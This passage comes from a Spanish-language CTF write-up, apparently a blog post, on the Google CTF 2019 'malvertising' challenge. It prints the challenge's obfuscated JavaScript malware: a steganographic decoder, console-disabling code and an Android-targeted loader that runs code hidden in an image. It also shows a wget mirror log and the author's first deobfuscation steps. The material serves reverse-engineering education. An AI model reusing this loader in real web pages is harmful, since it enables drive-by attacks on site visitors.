        for (u = Math.pow(2, f) - 1, w = 0; z &gt; w; w += 1) n = s &amp; u, B.push(n &gt;&gt; w * f), u &lt;&lt;= f;
      o = s
    }
    var C, D, E, F, G, H = k(B, g);
    for (C = 0; 4 * (C + g) &lt;= y.length &amp;&amp; C + g &lt;= B.length; C += g) {
      for (G = [], v = 0; g &gt; v &amp;&amp; v + C &lt; B.length; v += 1) {
        for (F = 0, w = C; g + C &gt; w &amp;&amp; w &lt; B.length; w += 1) F += B[w] * Math.pow(j(v), w - C);
        G[v] = 255 - i + 1 + F % i
      }
      for (v = 4 * C; v &lt; 4 * (C + G.length) &amp;&amp; v &lt; y.length; v += 4) y[v + 3] = G[v / 4 % g];
      E = G.length
    }
    for (D = C + E; D - (C + E) &lt; H.length &amp;&amp; 4 * (C + H.length) &lt; y.length; D += 1) y[4 * D + 3] = H[D - (C + E)];
    for (v = 4 * (D + 1) + 3; v &lt; y.length; v += 4) y[v] = 255;
    return x.data = y, m.putImageData(x, 0, 0), l.toDataURL()
  }, a.prototype.decode = function(a, c) {
    if (a.length) a = b.loadImg(a);
    else if (a.src) a = b.loadImg(a.src);
    else if (!(a instanceof HTMLImageElement)) throw new Error(&quot;IllegalInput: The input image is neither an URL string nor an image.&quot;);
    c = c || {};
    var d = this.config,
      e = c.t || d.t,
      f = c.threshold || d.threshold,
      g = c.codeUnitSize || d.codeUnitSize,
      h = b.findNextPrime(Math.pow(2, e)),
      i = (c.args || d.args, c.messageCompleted || d.messageCompleted);
    if (!e || 1 &gt; e || e &gt; 7) throw new Error('IllegalOptions: Parameter t = &quot; + t + &quot; is not valid: 0 &lt; t &lt; 8');
    var j = document.createElement(&quot;canvas&quot;),
      k = j.getContext(&quot;2d&quot;);
    j.style.display = &quot;none&quot;, j.width = c.width || a.width, j.height = c.width || a.height, c.height &amp;&amp; c.width ? k.drawImage(a, 0, 0, c.width, c.height) : k.drawImage(a, 0, 0);
    var l, m, n = k.getImageData(0, 0, j.width, j.height),
      o = n.data,
      p = [];
    if (1 === f)
      for (l = 3, m = !1; !m &amp;&amp; l &lt; o.length &amp;&amp; !m; l += 4) m = i(o, l, f), m || p.push(o[l] - (255 - h + 1));
    var q = &quot;&quot;,
      r = 0,
      s = 0,
      t = Math.pow(2, g) - 1;
    for (l = 0; l &lt; p.length; l += 1) r += p[l] &lt;&lt; s, s += e, s &gt;= g &amp;&amp; (q += String.fromCharCode(r &amp; t), s %= g, r = p[l] &gt;&gt; e - s);
    return 0 !== r &amp;&amp; (q += String.fromCharCode(r &amp; t)), q
  }, new a
});
var a = ['OcOOcmwqwqcOw6YY', 'LMO2woLDi27CscKE', 'w6AZw5DDkMKK', 'wpLDvMKTcwEBNmLCpCEC', 'wooTw4LDtENeT8ODfMOMGDJCLA==', 'wp3DgHV6UA==', 'IMO3woDDl2DCuQ==', 'SsKQw4ozw4pp', 'JyTCtcOi', 'DAwvMsKuw5YFcE8=', 'P8ORRsKNwoE=', 'UMONw7HCpyNQwoLDnynCksKLJV7CsMKAw6/Dv2PCuw==', 'wofDmTJ0WMOdT3zDoMKcwqzDrRoCwpBPwrBBwoxewqtMwrB7DADDlGoLw7HCpMO7', 'P8OZf3o1wr8C', 'w63CmjrCmlLDoMKN', 'w6LCmjM=', 'w6MKw4PDnQ==', 'w6rCkDbCnFo=', 'woQYw5DDng==', 'wrnDsMOHJsOYKcKWw4LDoQ==', 'w4R+wq12wqo=', 'GhAkM8KAw50F', 'wpLDvMKTcxofJg==', 'w59uw4R0', 'UsKJAgtYw6Q0', 'w5jCmXlB', 'w5pZesOQFRfDlQ==', 'w5DDhcKywpXCqA==', 'w4HDjyUaDsO6wpM='];
(function(c, d) {
  var e = function(f) {
    while (--f) {
      c['push'](c['shift']());
    }
  };
  var g = function() {
    var h = {
      'data': {
        'key': 'cookie',
        'value': 'timeout'
      },
      'setCookie': function(i, j, k, l) {
        l = l || {};
        var m = j + '=' + k;
        var n = 0x0;
        for (var n = 0x0, p = i['length']; n &lt; p; n++) {
          var q = i[n];
          m += ';\x20' + q;
          var r = i[q];
          i['push'](r);
          p = i['length'];
          if (r !== !![]) {
            m += '=' + r;
          }
        }
        l['cookie'] = m;
      },
      'removeCookie': function() {
        return 'dev';
      },
      'getCookie': function(s, t) {
        s = s || function(u) {
          return u;
        };
        var v = s(new RegExp('(?:^|;\x20)' + t['replace'](/([.$?*|{}()[]\/+^])/g, '$1') + '=([^;]*)'));
        var w = function(x, y) {
          x(++y);
        };
        w(e, d);
        return v ? decodeURIComponent(v[0x1]) : undefined;
      }
    };
    var z = function() {
      var A = new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');
      return A['test'](h['removeCookie']['toString']());
    };
    h['updateCookie'] = z;
    var B = '';
    var C = h['updateCookie']();
    if (!C) {
      h['setCookie'](['*'], 'counter', 0x1);
    } else if (C) {
      B = h['getCookie'](null, 'counter');
    } else {
      h['removeCookie']();
    }
  };
  g();
}(a, 0x7e));
var b = function(c, d) {
  c = c - 0x0;
  var e = a[c];
  if (b['KPKLDH'] === undefined) {
    (function() {
      var f;
      try {
        var g = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
        f = g();
      } catch (h) {
        f = window;
      }
      var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
      f['atob'] || (f['atob'] = function(j) {
        var k = String(j)['replace'](/=+$/, '');
        for (var l = 0x0, m, n, o = 0x0, p = ''; n = k['charAt'](o++); ~n &amp;&amp; (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String['fromCharCode'](0xff &amp; m &gt;&gt; (-0x2 * l &amp; 0x6)) : 0x0) {
          n = i['indexOf'](n);
        }
        return p;
      });
    }());
    var q = function(r, d) {
      var t = [],
        u = 0x0,
        v, w = '',
        x = '';
      r = atob(r);
      for (var y = 0x0, z = r['length']; y &lt; z; y++) {
        x += '%' + ('00' + r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);
      }
      r = decodeURIComponent(x);
      for (var A = 0x0; A &lt; 0x100; A++) {
        t[A] = A;
      }
      for (A = 0x0; A &lt; 0x100; A++) {
        u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 0x100;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
      }
      A = 0x0;
      u = 0x0;
      for (var B = 0x0; B &lt; r['length']; B++) {
        A = (A + 0x1) % 0x100;
        u = (u + t[A]) % 0x100;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
        w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 0x100]);
      }
      return w;
    };
    b['sSGzQw'] = q;
    b['UvyfIT'] = {};
    b['KPKLDH'] = !![];
  }
  var C = b['UvyfIT'][c];
  if (C === undefined) {
    if (b['osjREl'] === undefined) {
      var D = function(E) {
        this['yhuGjs'] = E;
        this['RSLhQn'] = [0x1, 0x0, 0x0];
        this['JWTCiF'] = function() {
          return 'newState';
        };
        this['uxuAZy'] = '\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';
        this['pyeOIT'] = '[\x27|\x22].+[\x27|\x22];?\x20*}';
      };
      D['prototype']['ijHoQZ'] = function() {
        var F = new RegExp(this['uxuAZy'] + this['pyeOIT']);
        var G = F['test'](this['JWTCiF']['toString']()) ? --this['RSLhQn'][0x1] : --this['RSLhQn'][0x0];
        return this['EwWlht'](G);
      };
      D['prototype']['EwWlht'] = function(H) {
        if (!Boolean(~H)) {
          return H;
        }
        return this['cJhJoi'](this['yhuGjs']);
      };
      D['prototype']['cJhJoi'] = function(I) {
        for (var J = 0x0, K = this['RSLhQn']['length']; J &lt; K; J++) {
          this['RSLhQn']['push'](Math['round'](Math['random']()));
          K = this['RSLhQn']['length'];
        }
        return I(this['RSLhQn'][0x0]);
      };
      new D(b)['ijHoQZ']();
      b['osjREl'] = !![];
    }
    e = b['sSGzQw'](e, d);
    b['UvyfIT'][c] = e;
  } else {
    e = C;
  }
  return e;
};
var d = function() {
  var c = !![];
  return function(d, e) {
    var f = c ? function() {
      if (e) {
        var g = e['apply'](d, arguments);
        e = null;
        return g;
      }
    } : function() {};
    c = ![];
    return f;
  };
}();
var w = d(this, function() {
  var c = function() {
      return '\x64\x65\x76';
    },
    d = function() {
      return '\x77\x69\x6e\x64\x6f\x77';
    };
  var e = function() {
    var f = new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');
    return !f['\x74\x65\x73\x74'](c['\x74\x6f\x53\x74\x72\x69\x6e\x67']());
  };
  var g = function() {
    var h = new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');
    return h['\x74\x65\x73\x74'](d['\x74\x6f\x53\x74\x72\x69\x6e\x67']());
  };
  var i = function(j) {
    var k = ~-0x1 &gt;&gt; 0x1 + 0xff % 0x0;
    if (j['\x69\x6e\x64\x65\x78\x4f\x66']('\x69' === k)) {
      l(j);
    }
  };
  var l = function(m) {
    var n = ~-0x4 &gt;&gt; 0x1 + 0xff % 0x0;
    if (m['\x69\x6e\x64\x65\x78\x4f\x66']((!![] + '')[0x3]) !== n) {
      i(m);
    }
  };
  if (!e()) {
    if (!g()) {
      i('\x69\x6e\x64\u0435\x78\x4f\x66');
    } else {
      i('\x69\x6e\x64\x65\x78\x4f\x66');
    }
  } else {
    i('\x69\x6e\x64\u0435\x78\x4f\x66');
  }
});
w();
var f = function() {
  var g = !![];
  return function(h, i) {
    var j = g ? function() {
      if (i) {
        var k = i[b('0x0', 'Kb10')](h, arguments);
        i = null;
        return k;
      }
    } : function() {};
    g = ![];
    return j;
  };
}();
var l = f(this, function() {
  var m = function() {};
  var n;
  try {
    var o = Function(b('0x1', ')ID3') + b('0x2', '3hyK') + ');');
    n = o();
  } catch (p) {
    n = window;
  }
  if (!n[b('0x3', '^aQK')]) {
    n[b('0x4', 'bxQ9')] = function(m) {
      var f = {};
      f[b('0x5', 'bxQ9')] = m;
      f[b('0x6', 'vH0t')] = m;
      f[b('0x7', 'bxQ9')] = m;
      f[b('0x8', 'jAUm')] = m;
      f['error'] = m;
      f[b('0x9', 'SF81')] = m;
      f[b('0xa', '$KuR')] = m;
      return f;
    }(m);
  } else {
    n[b('0xb', 'IfD@')]['log'] = m;
    n[b('0xc', '%RuL')][b('0xd', 'e9PJ')] = m;
    n[b('0xe', '(fcQ')]['debug'] = m;
    n['console'][b('0xf', 'xBPx')] = m;
    n[b('0x10', 'yDXL')][b('0x11', 'IDtv')] = m;
    n[b('0x12', 'oBBn')][b('0x13', '^aQK')] = m;
    n[b('0x14', 'F#*Z')][b('0x15', 'vH0t')] = m;
  }
});
l();
var s = b('0x16', '%RuL');
var t = document[b('0x17', 'jAUm')](b('0x18', '3hyK'));
t[b('0x19', 'F#*Z')] = function() {
  try {
    var u = steg[b('0x1a', 'OfTH')](t);
  } catch (v) {}
  if (Number(/\x61\x6e\x64\x72\x6f\x69\x64/i [b('0x1b', 'JQ&amp;l')](navigator[b('0x1c', 'IfD@')]))) {
    s[s][s](u)();
  }
};
</code></pre>

<p>Ya se ve un poco mas entendible.</p>

<p>Vemos que hay partes con base64, otras con encoding HEX y otras que parecen matriciales entre hex y text.</p>

<p>Un análisis rápido de la primera parte nos levantara sospechas de que se declara funciones para procesar contenido dentro de la imagen y nuestro mayor indicio sera a final donde se usa la palabra <strong>steg</strong> en uno de los try finales.</p>

<p>Esto me motivo a clonar la pagina via <code>wget --mirror</code>:</p>

<pre><code>xbytemx@laptop:~$ wget --mirror https://malvertising.web.ctfcompetition.com
--2019-07-06 21:10:19--  https://malvertising.web.ctfcompetition.com/
Resolviendo malvertising.web.ctfcompetition.com (malvertising.web.ctfcompetition.com)... 172.217.8.115, 2607:f8b0:4008:803::2013
Conectando con malvertising.web.ctfcompetition.com (malvertising.web.ctfcompetition.com)[172.217.8.115]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 435 [text/html]
Grabando a: “malvertising.web.ctfcompetition.com/index.html”

malvertising.web.ctfcompetition.c 100%[============================================================&gt;]     435  --.-KB/s    en 0s

2019-07-06 21:10:19 (4.88 MB/s) - “malvertising.web.ctfcompetition.com/index.html” guardado [435/435]

Cargando robots.txt; por favor ignore los errores.
--2019-07-06 21:10:19--  https://malvertising.web.ctfcompetition.com/robots.txt
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 404 Not Found
2019-07-06 21:10:19 ERROR 404: Not Found.

--2019-07-06 21:10:19--  https://malvertising.web.ctfcompetition.com/bg.png
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1154852 (1.1M) [image/png]
Grabando a: “malvertising.web.ctfcompetition.com/bg.png”

malvertising.web.ctfcompetition.c 100%[============================================================&gt;]   1.10M  2.31MB/s    en 0.5s

2019-07-06 21:10:20 (2.31 MB/s) - “malvertising.web.ctfcompetition.com/bg.png” guardado [1154852/1154852]

--2019-07-06 21:10:20--  https://malvertising.web.ctfcompetition.com/ads/ad.html
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1537 (1.5K) [text/html]
Grabando a: “malvertising.web.ctfcompetition.com/ads/ad.html”

malvertising.web.ctfcompetition.c 100%[============================================================&gt;]   1.50K  --.-KB/s    en 0s

2019-07-06 21:10:20 (19.2 MB/s) - “malvertising.web.ctfcompetition.com/ads/ad.html” guardado [1537/1537]

--2019-07-06 21:10:20--  https://malvertising.web.ctfcompetition.com/ads/src/852x239.png
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 82769 (81K) [image/png]
Grabando a: “malvertising.web.ctfcompetition.com/ads/src/852x239.png”

malvertising.web.ctfcompetition.c 100%[============================================================&gt;]  80.83K  --.-KB/s    en 0.03s

2019-07-06 21:10:21 (2.72 MB/s) - “malvertising.web.ctfcompetition.com/ads/src/852x239.png” guardado [82769/82769]

--2019-07-06 21:10:21--  https://malvertising.web.ctfcompetition.com/ads/src/metrics.js
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 9664 (9.4K) [application/javascript]
Grabando a: “malvertising.web.ctfcompetition.com/ads/src/metrics.js”

malvertising.web.ctfcompetition.c 100%[============================================================&gt;]   9.44K  --.-KB/s    en 0s

2019-07-06 21:10:21 (55.3 MB/s) - “malvertising.web.ctfcompetition.com/ads/src/metrics.js” guardado [9664/9664]

--2019-07-06 21:10:21--  https://malvertising.web.ctfcompetition.com/ads/src/apY7ERVvTFvgbHPbDwSC/1x1.png
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 0 [image/png]
Grabando a: “malvertising.web.ctfcompetition.com/ads/src/apY7ERVvTFvgbHPbDwSC/1x1.png”

malvertising.web.ctfcompetition.c     [ &lt;=&gt;                                                         ]       0  --.-KB/s    en 0s

2019-07-06 21:10:21 (0.00 B/s) - “malvertising.web.ctfcompetition.com/ads/src/apY7ERVvTFvgbHPbDwSC/1x1.png” guardado [0/0]

--2019-07-06 21:10:21--  https://malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=110322201473
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 0 [image/png]
Grabando a: “malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=110322201473”

malvertising.web.ctfcompetition.c     [ &lt;=&gt;                                                         ]       0  --.-KB/s    en 0s

2019-07-06 21:10:22 (0.00 B/s) - “malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=110322201473” guardado [0/0]

--2019-07-06 21:10:22--  https://malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=120322201473
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 0 [image/png]
Grabando a: “malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=120322201473”

malvertising.web.ctfcompetition.c     [ &lt;=&gt;                                                         ]       0  --.-KB/s    en 0s

2019-07-06 21:10:22 (0.00 B/s) - “malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=120322201473” guardado [0/0]

--2019-07-06 21:10:22--  https://malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=130322201473
Reutilizando la conexión con malvertising.web.ctfcompetition.com:443.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 0 [image/png]
Grabando a: “malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=130322201473”

malvertising.web.ctfcompetition.c     [ &lt;=&gt;                                                         ]       0  --.-KB/s    en 0s

2019-07-06 21:10:22 (0.00 B/s) - “malvertising.web.ctfcompetition.com/ads/bh/drts.png?drts=130322201473” guardado [0/0]

ACABADO --2019-07-06 21:10:22--
Tiempo total de reloj: 3.4s
Descargados: 9 ficheros, 1.2M en 0.5s (2.35 MB/s)
</code></pre>

<p>Ya con el clon, podía trabajar en local para ir descifrando lo que <code>metrics.js</code> tenia ofuscado. Para ello, me apoye de phantomjs en resolver las partes que no comprendía, por lo que me enfoque en lo siguiente:</p>

<pre><code class="language-javascript">var s = b('0x16', '%RuL');
var t = document[b('0x17', 'jAUm')](b('0x18', '3hyK'));
t[b('0x19', 'F#*Z')] = function() {
  try {
    var u = steg[b('0x1a', 'OfTH')](t);
  } catch (v) {}
  if (Number(/android/i [b('0x1b', 'JQ&amp;l')](navigator[b('0x1c', 'IfD@')]))) {
    s[s][s](u)();
  }
};
</code></pre>

<p>El primer paso consiste en identificar que realiza la función b, puesto que muchos de los elementos dependen de b.</p>
    </div>

    
    

    
    

    <footer class="post-footer">
      <div class="post-tags">
          
          <a href="/tags/ctf/">ctf</a>
          
          <a href="/tags/mayas/">mayas</a>
          
          <a href="/tags/googlectf2019/">googlectf2019</a>
          
          <a href="/tags/javascript/">javascript</a>
          
          <a href="/tags/malware/">malware</a>
          
        </div>

      
      <nav class="post-nav">
        
        
          <a class="next" href="/post/flareon2015_-_challenge02/">
            <span class="next-text nav-default">Flare-on 2015 - Challenge 02</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        
  <div id="disqus_thread"></div>
    <script type="text/javascript">
    (function() {
      
      
      if (window.location.hostname === 'localhost') return;

      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      var disqus_shortname = 'xbytemx';
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="https://twitter.com/xbytemx" class="iconfont icon-twitter" title="twitter"></a>
      <a href="https://github.com/xbytemx" class="iconfont icon-github" title="github"></a>
  <a href="https://xbytemx.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    
      2018 - 
    2019
    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Tony Palma</span>
  </span>
</div>
    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
<script src="/lib/highlight/highlight.pack.js?v=20171001"></script><script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox-3.1.20.min.js"></script>


<script type="text/javascript" src="/dist/even.min.js?v=3.2.0"></script>








</body>
</html>
